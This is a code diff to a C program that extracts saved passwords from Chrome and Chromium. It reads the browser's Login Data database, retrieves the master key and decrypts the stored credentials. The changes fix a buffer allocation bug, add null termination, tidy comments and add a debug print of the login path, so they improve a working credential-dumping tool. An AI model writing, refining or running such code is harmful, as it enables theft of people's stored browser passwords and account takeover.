@@ -39,7 +39,7 @@ int fetch_sqlite_data(char **website, char **username, char **cipher_password, i
 	// TODO: View better alternative to strncpy
 	*website = malloc(strlen(sqlite3_column_text(*stmt, 0))+1);
 	*username = malloc(strlen(sqlite3_column_text(*stmt, 1))+1);
-	*cipher_password = malloc(strlen(sqlite3_column_text(*stmt, 2)+1));
+	*cipher_password = malloc(sqlite3_column_bytes(*stmt, 2)+1);
 	if(*website == 0 || *username == 0 || *cipher_password == 0) {
 		fprintf(stderr, "malloc() failure\n");
 		free(*website);
@@ -51,6 +51,7 @@ int fetch_sqlite_data(char **website, char **username, char **cipher_password, i
 	safe_strcpy(*website, (char *)sqlite3_column_text(*stmt, 0), strlen(sqlite3_column_text(*stmt, 0)));
 	safe_strcpy(*username, (char *)sqlite3_column_text(*stmt, 1), strlen(sqlite3_column_text(*stmt, 1)));
 	memcpy(*cipher_password, (char *)sqlite3_column_blob(*stmt, 2), sqlite3_column_bytes(*stmt, 2));
+	(*cipher_password)[sqlite3_column_bytes(*stmt, 2)] = '\0';
 	*len_cipher_password = sqlite3_column_bytes(*stmt, 2);
 
 	return 1;
@@ -69,13 +70,11 @@ int get_chrome_creds(char *login_data_path, const char *output) {
 		return -1;
 	}
 
-	// TODO: find a better way to do this.
 	char *masterkey;
 	if(get_masterkey(login_data_path, &masterkey) == -1) {
 		fprintf(stderr, "get_masterkey() failure\n");
 		return -1;
 	}
-	//printf("[*] Master Key: %s \n", masterkey);
 
 	char *website;
 	char *username;
@@ -93,7 +92,6 @@ int get_chrome_creds(char *login_data_path, const char *output) {
 			fprintf(stderr, "fetch_sqlite_data() failure\n");
 			return -1;
 		} 
-		
 		if(strlen(website) != 0) {
 			if(decrypt_chrome_cipher(cipher_password, len_cipher_password, &plaintext_password, masterkey) == -1) {
 				fprintf(stderr, "decrypt_chrome_cipher() failure\n");
@@ -129,6 +127,11 @@ int get_chrome_creds(char *login_data_path, const char *output) {
 	return 1;
 }
 
+/**
+ * Chrome functions wrapper that sets up everything we need
+ *
+ * @return 1 on success, -1 on failure 
+ */
 int dump_chrome(int verbose, const char *output_file) {
 	puts("[*] Starting Chrome dump...");
 	int result = 0;
@@ -139,9 +142,8 @@ int dump_chrome(int verbose, const char *output_file) {
 	//char brave_path[MAX_PATH_SIZE];
 	//char brave_login_data_path[MAX_PATH_SIZE];
 
-	// TODO: Add brave support
-
 	load_chrome_paths(chrome_path, chrome_login_data_path, chromium_path, chromium_login_data_path);
+	printf("chromium login path: %s\n", chromium_login_data_path);
 
 	// TODO: S_OK / F_OK ?
 	if(access(chrome_login_data_path,0) != -1) {
